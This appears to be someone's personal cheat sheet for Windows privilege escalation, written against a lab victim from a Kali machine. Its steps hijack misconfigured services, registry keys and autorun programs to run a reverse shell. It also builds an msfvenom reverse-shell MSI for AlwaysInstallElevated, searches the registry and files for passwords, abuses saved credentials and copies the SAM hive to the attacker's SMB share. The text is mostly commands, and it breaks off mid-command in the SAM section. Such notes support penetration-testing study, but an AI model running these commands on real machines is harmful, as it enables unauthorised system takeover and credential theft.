                                                                      POWERUP
Powerup is a tool that can help you find privilege escalation vulnerabilities

enter powershell:
powershell -exec bypass

run the powerup script:
. ./Powerup.psq

then run the invoke all checks function:
Invoke-AllChecks

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

                                                                     SEATBELT
seatbelt is another script for trying to find privilege escalation vulnerabilities 

if you just wanted seatbelt to list non-standard services:
.\Seatbelt.exe NonstandardServices

run all enumeration checks seatbelt has to offer
.\Seartbelt.exe all

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          WINPEAS

winPEAS is a very powerfull tool that not only aactively hunts for privilege escalation misconfigurations but highlights them for the user in the results

before running winPEAS add the following registry key:
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

look at the different type of checks winpeas can do:
./winPEASany.exe -h

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                        ACCESSCHK.EXE
                                                                 
accessChk is an old but still trustworhy tool for checking user access control rights

you can use it to check weather a user or group has access to files, directories, services and registry keys.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          KERNEL EXPLOITS

steps to take to identify potential kernel exploits:

1. set up an smb server on the attacking machine
  a. /usr/share/doc/python-impacket/examples/smbserver.py tools .

2. on the victim machine run the systeminfo command and transfer the output to the attacking machine:
  b. systeminfo > \\192.168.1.244\tools\systeminfo
  
3. next on the attacking machine run the wes.py script to parse the systeminfo file for vulnerabilities
  c. python wes.py /root/windows-privesc/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
  
4. follow the instructions in the exploit and run them.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          SERVICE EXPLOITS
query the configuration of a service:
sc.exe qc <name>

query the current satus of a service
sc.exe query <name>

modify a configuration option of a service:
sc.exe config <name> <option>= <value>

Start/Stop a service:
net start/strop <name>

                                                                   insecure service permissions
to enumerate insecure service permissions with winpeas use this command:
winPeasany.exe quiet servicesinfo 

if there is a service winpeas says is modifyable we can check with accesschk.exe:
accesschk.exe /accepteula -uwcqv <username> <service>

make sure you see this output come from the above command:
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP

next query the services configuration to get some details:
sc qc daclsvc

check the current state of the service:
sc query daclsvc

change the path of the service to where our reverse shell payload is stored:
sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""

start a listner in kali"
nc -nlvp 1337

start the service on the victim machine 
net start <service>

DONE PRIVESC

                                                                   Unquoted Service Path
run winpeas.exe to search for unquoted service path's:
winPEASany.exe quiet servicesinfo 

next check permissions on the service with an unquoted path:
accesschk.exe /accepteula -ucqv <user> <service>

make sure you see this ouput from the above command:
SERVICE_START
SERVICE_STOP

next use accesschk to figure out your permissions on the directories leading up to the service:
accesschk.exe /accepteula -uwdq C:\

accesschk.exe /accepteula -uwdq "C:\Program Files\"

accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

in the output from the above command wait until it shows RW for the user your group belongs too*

copy your reverse shell to the writeable directory and rename it common.exe:
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

set up a listner on the attacking machine:
nc -nlvp 1337

finally sart the service:
net start <service>

PRIVESC DONE

                                                                  Weak Registry permissions
first run winpeas to see if there is weak registry permissions:
winPEASany.exe quiet servicesinfo

verify the permissions on the registry with powershell;
powershell -exec bypass

Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List

use accesschk to verfy that we can start the service:
accesschk.exe /accepteula -ucqv <user> regsvc

make sure you see this uotput from the above command:
SERVICE_START
SERVICE_STOP

next check the current values in the service registry entry:
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

next change the ImagePath to our reverse shell:
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImpagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

start a listner on the attacking machine:
nc -nlvp 1337

finally start the service:
net start <service>

PRIVESC DONE

                                                                       Insecure Service Executable
                                                                       
run this winpeas command to find insecure service executables:
winPeasany.exe quiet servicesinfo 

in the winpeas output if you see an executable writebale by everyone you are good to go*

check if the .exe file permissions are writebale by everyone:
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe

check for this output from the above command:
RW Everyone
FILE_ALL_ACCESS

make sure we can start and stop the service:
accesschk.exe /accepteula -uvqc filepermsvc

check for this output from the above command:
SERVICE_START
SERVICE_STOP

next back up the original service executable:
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp

then copy the reverse shell executable and overwrite the original service executable:
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

set up a listner on the attacking machine:
nc -nlvp 1337

then start the service:
net start service

PRIVESC DONE

                                                                            DLL HIJACKING
                                                                            
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                            Registry exploits
                                                                            
run winpeas with the aplications info check:
winPeasany.exe quiet applicationsinfo

we can also do this manually by querying the registry for autorun programs:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

then we can use accesschk to verify the permissions on the auto run executables:
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

make sure our user, or our group, or everyone has full access to the file in question*

first make a backup of the original executable:
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp

then copy our reverse shell executable to overwrite the .exe executable:
copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"

next set up a listner on the attacking machine:
nc -nlvp 1337

                                                                         AlwaysInstallElevated

run winpeas with the windowscreds check to discover the vulnerability:
winPEASany.exe quiet windowscreds

to do this manually we can query the registry for the keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

create a new msfvenom shell on the attacking machine:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f msi -o /tools/reverse.msi

next set up a listner on the kali machine:
nc -nlvp 1337

set up an smbserver to transfer the exploit:
/usr/share/doc/python-impacket/examples/smbserver.py tools .

copy over the reverse shell.
copy \\192.168.1.244\tools\reverse.msi .

run the reverse shell on the victim machine:
msiexec /quiet /qn /i reverse.msi

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          PASSWORDS
                                                                          
seraching for passwords with winpeas:
winPEASany.exe quiet filesinfo userinfo

once a password is found we can use winexe command to spawn a shell:
winexe -U 'admin%password123' //192.168.1.22 cmd.exe

this command will query the registry for passwords
reg query HKLM /f password /t REG_SZ /s

                                                                          Saved Creds
use winpeas to search for stored passwords/credntials:
winPEASany.exe quiet cmd windowscreds

confirm is the password is in fact stored:
cmdkey /list

set up a listner on kali:
nc -nlvp 1337

we can use the saved admin cred we want to run any command as the admin user:
runas /savecred /user:admin C:\PrivEsc\reverse.exe

                                                                     configuration files
                                                                     
Recursively search for files in the current directory with "pass" in the name, or ending in ".config"
dir /s *pass* == *.config

Recursively serch for files in the current directory that contain the ord "password" and also end in either .xml, .ini, or .txt
findstr /si password *.xml *.ini *.txt

search for passwords in configuration files with WinPeas:
winPEASany.exe quiet cmd searchfast filesinfo

                                                                            SAM
                                                                            
copy the SAM files back to kali:
copy C:\Windows\Repair\SAM \\192.168.1.244\tools\

copy the SAM files back to kali:
copy C:\Windows












































